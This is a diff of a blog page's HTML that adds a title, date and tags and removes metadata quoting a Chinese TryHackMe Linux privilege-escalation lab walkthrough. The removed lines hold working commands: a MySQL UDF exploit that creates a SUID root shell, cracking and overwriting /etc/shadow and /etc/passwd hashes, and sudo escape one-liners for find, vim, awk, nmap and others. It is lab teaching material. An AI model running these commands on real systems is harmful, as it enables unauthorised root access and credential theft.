@@ -2,72 +2,12 @@
 <html lang="en">
 <head>
   
-    <title> :: badwichell</title>
+    <title>Linux提权方法-基础篇 :: badwichell</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Linux PrivEsc-基础篇 各类Linux提权方法，持续更新。
-0x1 INFO 根据该靶场的介绍，会带我们进行各种​ Linux 权限提升技术​的学习
-0x2 靶机连接 我们按照指示对靶机进行连接，由于OPENssh启用了ssh-rsa，我们必须添加该参数-oHostKeyAlgorithms=&#43;ssh-rsa​
-┌──(kali㉿kali)-[~] └─$ ssh user@10.10.134.160 -oHostKeyAlgorithms=&#43;ssh-rsa The authenticity of host &amp;#39;10.10.134.160 (10.10.134.160)&amp;#39; can&amp;#39;t be established. RSA key fingerprint is SHA256:JwwPVfqC&#43;8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yews Please type &amp;#39;yes&amp;#39;, &amp;#39;no&amp;#39; or the fingerprint: yes Warning: Permanently added &amp;#39;10.10.134.160&amp;#39; (RSA) to the list of known hosts. user@10.10.134.160&amp;#39;s password: Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Fri May 15 06:41:23 2020 from 192.168.1.125 此时已经连接上靶场，回答第一个问题。
-问题一：在部署连接过后运行“id”命令。结果是什么？ 此时我们按照提示在命令行中输入id即可获取答案
-0x2 服务利用 MySQL 服务以 root 身份运行，并且该服务的“root”用户没有分配密码。我们可以使用一个流行的漏洞利用，它利用用户定义函数 (UDF) 通过 MySQL 服务以 root 身份运行系统命令。
-使用cd /home/user/tools/mysql-udf​切换至该目录
-我们可以看到在靶场给到的超链接中，标题是MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)，是一个mysql4.5到5.0版本linux端的一个漏洞利用，我们首先来看看漏洞利用方式。
-​​
-使用以下命令编译 raptor_udf2.c 漏洞利用代码：
-gcc -g -c raptor_udf2.c -fPIC gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 以 root 用户身份使用空白密码连接到 MySQL 服务：
-mysql -u root 在 MySQL shell 上执行以下命令以使用我们编译的漏洞创建用户定义函数 (UDF)“do_system”：
-use mysql; create table foo(line blob); insert into foo values(load_file(&amp;#39;/home/user/tools/mysql-udf/raptor_udf2.so&amp;#39;)); select * from foo into dumpfile &amp;#39;/usr/lib/mysql/plugin/raptor_udf2.so&amp;#39;; create function do_system returns integer soname &amp;#39;raptor_udf2.so&amp;#39;; 使用函数将/bin/bash复制到/tmp/rootbash并设置SUID权限：
-select do_system(&amp;#39;cp /bin/bash /tmp/rootbash; chmod &#43;xs /tmp/rootbash&amp;#39;); 退出 MySQL shell 并使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell：
-/tmp/rootbash -p 请记住在继续之前删除 /tmp/rootbash 可执行文件并退出 root shell：
-rm /tmp/rootbash exit 0x3 弱文件权限 /etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。
-请注意，VM 上的 /etc/shadow 文件是全局可读的：
-​ls -l /etc/shadow​
-查看/etc/shadow文件内容：
-​cat /etc/shadow​
-文件的每一行代表一个用户。可以在每行的第一个和第二个冒号 (:) 之间找到用户的密码哈希（如果他们有的话）。
-将 root 用户的哈希值保存到 Kali VM 上一个名为 hash.txt 的文件中，然后使用 john the ripper 来破解它。可能需要先解压缩 /usr/share/wordlists/rockyou.txt.gz 并根据您的 Kali 版本使用 sudo 运行命令：
-​john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt​
-┌──(kali㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 8 OpenMP threads Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status 自己去尝试一下吧 (root) 1g 0:00:00:04 0.11% (ETA: 10:59:33) 0.2336g/s 4306p/s 4785c/s 4785C/s sweetgurl..libragirl Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably Session aborted 切换到root用户，使用破解的密码：
-​su root​
-还有一种方式，写入
-/etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。
-请注意，VM 上的 /etc/shadow 文件是全局可写的：
-​ls -l /etc/shadow​
-使用您选择的密码生成新密码哈希：
-​mkpasswd -m sha-512 “你的密码”​
-编辑 /etc/shadow 文件并将原始 root 用户的密码哈希替换为您刚刚生成的密码。
-切换到 root 用户，使用新密码：
-​su root​
-另一种同样利用方式
-/etc/passwd 文件包含有关用户帐户的信息。它是全局可读的，但通常只能由 root 用户写入。从历史上看，/etc/passwd 文件包含用户密码哈希值，某些版本的 Linux 仍然允许将密码哈希值存储在那里。
-请注意，/etc/passwd 文件是全局可写的：
-​ls -l /etc/passwd​
-使用您选择的密码生成新密码哈希：
-​openssl passwd “你的新密码”​
-编辑 /etc/passwd 文件并将生成的密码散列放在根用户行的第一个和第二个冒号 (:) 之间（替换“x”）。
-user@debian:~$ openssl passwd open123456 Warning: truncating password to 8 characters P1kI55UCjXLJM 切换到 root 用户，使用新密码：
-​su root​
-或者，复制 root 用户的行并将其附加到文件底部，将单词“root”的第一个实例更改为“newroot”并将生成的密码哈希 放在第一个和第二个冒号之间（替换“x”） .
-现在切换到 newroot 用户，使用新密码：
-​su newroot​
-0x4 shell转义序列 列出 sudo 允许您的用户运行的程序：
-​sudo -l​
-访问 GTFOBins ( https://gtfobins.github.io ) 并搜索一些程序名称。如果程序以“sudo”作为函数列出，您可以使用它来提升权限，通常是通过转义序列。
-从列表中选择一个程序并尝试使用 GTFOBins 中的说明获取 root shell
-首先我们执行sudo -l查看
-user@debian:~$ sudo -l Matching Defaults entries for user on this host: env_reset, env_keep&#43;=LD_PRELOAD, env_keep&#43;=LD_LIBRARY_PATH User user may run the following commands on this host: (root) NOPASSWD: /usr/sbin/iftop (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/nano (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/man (root) NOPASSWD: /usr/bin/awk (root) NOPASSWD: /usr/bin/less (root) NOPASSWD: /usr/bin/ftp (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/sbin/apache2 (root) NOPASSWD: /bin/more iftop ​​
-打开GTFOBins，搜索第一个iftop，任何按照说明
-首先sudo iftop进入iftop，在命令行输入!/bin/sh
-user@debian:~$ sudo iftop interface: eth0 IP address is: 10.10.134.160 MAC address is: 02:7a:ce:e8:51:93 sh-4.1# whoami root find user@debian:~$ sudo find . -exec /bin/sh \; -quit sh-4.1# whoami root nano ​
-运行 sudo /usr/bin/nano
-输入 Ctrl &#43; R 然后 Ctrl &#43; X
-输入 reset; bash 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0
-vim vim要简单一点
-user@debian:~$ sudo vim -c &amp;#39;:!/bin/sh&amp;#39; sh-4.1# ls 1 myvpn.ovpn tools sh-4.1# whoami root man user@debian:~$ sudo man man sh-4.1# whoami root 输入 sudo man man后输入! /bin/sh
-AWK user@debian:~$ sudo awk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&amp;#39; sh-4.1# whoami root less user@debian:~$ sudo less /etc/profile sh-4.1# whoami root FTP user@debian:~$ sudo ftp ftp&amp;gt; !/bin/sh sh-4.1# sudo ftp ftp&amp;gt; !/bin/sh sh-4.1# whoami root nmap user@debian:~$ sudo nmap --interactive Starting Nmap V. 5.00 ( http://nmap.org ) Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; for help nmap&amp;gt; ! sh sh-4.1# whoami root " />
-<meta name="keywords" content="web攻防,内网渗透,免杀,红队,redteam,tryhackme,hackthebox,信息安全" />
+<meta name="description" content="linux提权" />
+<meta name="keywords" content="web攻防, linux提权" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="/tryhackme/linux-privesc-%E5%9F%BA%E7%A1%80%E7%AF%87/" />
 
@@ -103,78 +43,20 @@ AWK user@debian:~$ sudo awk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&a
 
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="">
-<meta property="og:description" content="Linux PrivEsc-基础篇 各类Linux提权方法，持续更新。
-0x1 INFO 根据该靶场的介绍，会带我们进行各种​ Linux 权限提升技术​的学习
-0x2 靶机连接 我们按照指示对靶机进行连接，由于OPENssh启用了ssh-rsa，我们必须添加该参数-oHostKeyAlgorithms=&#43;ssh-rsa​
-┌──(kali㉿kali)-[~] └─$ ssh user@10.10.134.160 -oHostKeyAlgorithms=&#43;ssh-rsa The authenticity of host &amp;#39;10.10.134.160 (10.10.134.160)&amp;#39; can&amp;#39;t be established. RSA key fingerprint is SHA256:JwwPVfqC&#43;8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yews Please type &amp;#39;yes&amp;#39;, &amp;#39;no&amp;#39; or the fingerprint: yes Warning: Permanently added &amp;#39;10.10.134.160&amp;#39; (RSA) to the list of known hosts. user@10.10.134.160&amp;#39;s password: Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Fri May 15 06:41:23 2020 from 192.168.1.125 此时已经连接上靶场，回答第一个问题。
-问题一：在部署连接过后运行“id”命令。结果是什么？ 此时我们按照提示在命令行中输入id即可获取答案
-0x2 服务利用 MySQL 服务以 root 身份运行，并且该服务的“root”用户没有分配密码。我们可以使用一个流行的漏洞利用，它利用用户定义函数 (UDF) 通过 MySQL 服务以 root 身份运行系统命令。
-使用cd /home/user/tools/mysql-udf​切换至该目录
-我们可以看到在靶场给到的超链接中，标题是MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)，是一个mysql4.5到5.0版本linux端的一个漏洞利用，我们首先来看看漏洞利用方式。
-​​
-使用以下命令编译 raptor_udf2.c 漏洞利用代码：
-gcc -g -c raptor_udf2.c -fPIC gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 以 root 用户身份使用空白密码连接到 MySQL 服务：
-mysql -u root 在 MySQL shell 上执行以下命令以使用我们编译的漏洞创建用户定义函数 (UDF)“do_system”：
-use mysql; create table foo(line blob); insert into foo values(load_file(&amp;#39;/home/user/tools/mysql-udf/raptor_udf2.so&amp;#39;)); select * from foo into dumpfile &amp;#39;/usr/lib/mysql/plugin/raptor_udf2.so&amp;#39;; create function do_system returns integer soname &amp;#39;raptor_udf2.so&amp;#39;; 使用函数将/bin/bash复制到/tmp/rootbash并设置SUID权限：
-select do_system(&amp;#39;cp /bin/bash /tmp/rootbash; chmod &#43;xs /tmp/rootbash&amp;#39;); 退出 MySQL shell 并使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell：
-/tmp/rootbash -p 请记住在继续之前删除 /tmp/rootbash 可执行文件并退出 root shell：
-rm /tmp/rootbash exit 0x3 弱文件权限 /etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。
-请注意，VM 上的 /etc/shadow 文件是全局可读的：
-​ls -l /etc/shadow​
-查看/etc/shadow文件内容：
-​cat /etc/shadow​
-文件的每一行代表一个用户。可以在每行的第一个和第二个冒号 (:) 之间找到用户的密码哈希（如果他们有的话）。
-将 root 用户的哈希值保存到 Kali VM 上一个名为 hash.txt 的文件中，然后使用 john the ripper 来破解它。可能需要先解压缩 /usr/share/wordlists/rockyou.txt.gz 并根据您的 Kali 版本使用 sudo 运行命令：
-​john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt​
-┌──(kali㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 8 OpenMP threads Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status 自己去尝试一下吧 (root) 1g 0:00:00:04 0.11% (ETA: 10:59:33) 0.2336g/s 4306p/s 4785c/s 4785C/s sweetgurl..libragirl Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably Session aborted 切换到root用户，使用破解的密码：
-​su root​
-还有一种方式，写入
-/etc/shadow 文件包含用户密码哈希，通常只能由 root 用户读取。
-请注意，VM 上的 /etc/shadow 文件是全局可写的：
-​ls -l /etc/shadow​
-使用您选择的密码生成新密码哈希：
-​mkpasswd -m sha-512 “你的密码”​
-编辑 /etc/shadow 文件并将原始 root 用户的密码哈希替换为您刚刚生成的密码。
-切换到 root 用户，使用新密码：
-​su root​
-另一种同样利用方式
-/etc/passwd 文件包含有关用户帐户的信息。它是全局可读的，但通常只能由 root 用户写入。从历史上看，/etc/passwd 文件包含用户密码哈希值，某些版本的 Linux 仍然允许将密码哈希值存储在那里。
-请注意，/etc/passwd 文件是全局可写的：
-​ls -l /etc/passwd​
-使用您选择的密码生成新密码哈希：
-​openssl passwd “你的新密码”​
-编辑 /etc/passwd 文件并将生成的密码散列放在根用户行的第一个和第二个冒号 (:) 之间（替换“x”）。
-user@debian:~$ openssl passwd open123456 Warning: truncating password to 8 characters P1kI55UCjXLJM 切换到 root 用户，使用新密码：
-​su root​
-或者，复制 root 用户的行并将其附加到文件底部，将单词“root”的第一个实例更改为“newroot”并将生成的密码哈希 放在第一个和第二个冒号之间（替换“x”） .
-现在切换到 newroot 用户，使用新密码：
-​su newroot​
-0x4 shell转义序列 列出 sudo 允许您的用户运行的程序：
-​sudo -l​
-访问 GTFOBins ( https://gtfobins.github.io ) 并搜索一些程序名称。如果程序以“sudo”作为函数列出，您可以使用它来提升权限，通常是通过转义序列。
-从列表中选择一个程序并尝试使用 GTFOBins 中的说明获取 root shell
-首先我们执行sudo -l查看
-user@debian:~$ sudo -l Matching Defaults entries for user on this host: env_reset, env_keep&#43;=LD_PRELOAD, env_keep&#43;=LD_LIBRARY_PATH User user may run the following commands on this host: (root) NOPASSWD: /usr/sbin/iftop (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/nano (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/man (root) NOPASSWD: /usr/bin/awk (root) NOPASSWD: /usr/bin/less (root) NOPASSWD: /usr/bin/ftp (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/sbin/apache2 (root) NOPASSWD: /bin/more iftop ​​
-打开GTFOBins，搜索第一个iftop，任何按照说明
-首先sudo iftop进入iftop，在命令行输入!/bin/sh
-user@debian:~$ sudo iftop interface: eth0 IP address is: 10.10.134.160 MAC address is: 02:7a:ce:e8:51:93 sh-4.1# whoami root find user@debian:~$ sudo find . -exec /bin/sh \; -quit sh-4.1# whoami root nano ​
-运行 sudo /usr/bin/nano
-输入 Ctrl &#43; R 然后 Ctrl &#43; X
-输入 reset; bash 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0
-vim vim要简单一点
-user@debian:~$ sudo vim -c &amp;#39;:!/bin/sh&amp;#39; sh-4.1# ls 1 myvpn.ovpn tools sh-4.1# whoami root man user@debian:~$ sudo man man sh-4.1# whoami root 输入 sudo man man后输入! /bin/sh
-AWK user@debian:~$ sudo awk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&amp;#39; sh-4.1# whoami root less user@debian:~$ sudo less /etc/profile sh-4.1# whoami root FTP user@debian:~$ sudo ftp ftp&amp;gt; !/bin/sh sh-4.1# sudo ftp ftp&amp;gt; !/bin/sh sh-4.1# whoami root nmap user@debian:~$ sudo nmap --interactive Starting Nmap V. 5.00 ( http://nmap.org ) Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; for help nmap&amp;gt; ! sh sh-4.1# whoami root " />
+<meta property="og:title" content="Linux提权方法-基础篇">
+<meta property="og:description" content="linux提权" />
 <meta property="og:url" content="/tryhackme/linux-privesc-%E5%9F%BA%E7%A1%80%E7%AF%87/" />
 <meta property="og:site_name" content="badwichell" />
 
   
-    <meta property="og:image" content="/img/favicon/blue.png">
   
+  <meta property="og:image" content="/">
 
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="627">
 
+
+  <meta property="article:published_time" content="2022-12-13 12:02:03 -0500 EST" />
 
 
 
@@ -259,16 +141,31 @@ AWK user@debian:~$ sudo awk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&a
     
 <article class="post">
   <h1 class="post-title">
-    <a href="/tryhackme/linux-privesc-%E5%9F%BA%E7%A1%80%E7%AF%87/"></a>
+    <a href="/tryhackme/linux-privesc-%E5%9F%BA%E7%A1%80%E7%AF%87/">Linux提权方法-基础篇</a>
   </h1>
   <div class="post-meta">
     
+      <time class="post-date">
+        2022-12-13 ::
+        
+          [Updated :: 2022-12-13]
+        
+      </time>
     
     
-      <span class="post-reading-time">:: 12 min read (2464 words)</span>
+      <span class="post-author">@badwichell</span>
+    
     
   </div>
 
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/tryhackme/">tryhackme</a>&nbsp;
+      
+      #<a href="/tags/linux-suid/">Linux SUID</a>&nbsp;
+      
+    </span>
   
   
 
@@ -291,9 +188,9 @@ AWK user@debian:~$ sudo awk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&a
         <li><a href="#less">less</a></li>
         <li><a href="#ftp">FTP</a></li>
         <li><a href="#nmap">nmap</a></li>
+        <li><a href="#more">more</a></li>
       </ul>
     </li>
-    <li><a href="#heading"></a></li>
   </ul>
 
   <ul>
@@ -312,8 +209,7 @@ AWK user@debian:~$ sudo awk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&a
   
 
   <div class="post-content"><div>
-        <h1 id="linux-privesc-基础篇">Linux PrivEsc-基础篇<a href="#linux-privesc-基础篇" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<blockquote>
+        <blockquote>
 <p>各类Linux提权方法，持续更新。</p>
 </blockquote>
 <h1 id="0x1-info">0x1 INFO<a href="#0x1-info" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
@@ -489,7 +385,7 @@ AWK user@debian:~$ sudo awk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&a
 </span></span><span style="display:flex;"><span>nmap&gt; ! sh
 </span></span><span style="display:flex;"><span>sh-4.1# whoami
 </span></span><span style="display:flex;"><span>root
-</span></span></code></pre></div><h2 id="heading"><a href="#heading" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+</span></span></code></pre></div><h3 id="more">more<a href="#more" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ TERM<span style="color:#f92672">=</span> sudo more /etc/profile
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/profile: system-wide .profile file for the Bourne shell (sh(1))</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).</span>
@@ -884,6 +780,7 @@ chmod +xs /tmp/rootbash</p>
 <p>‍</p>
 <p>‍</p>
 <p>‍</p>
+
       </div></div>
 
   
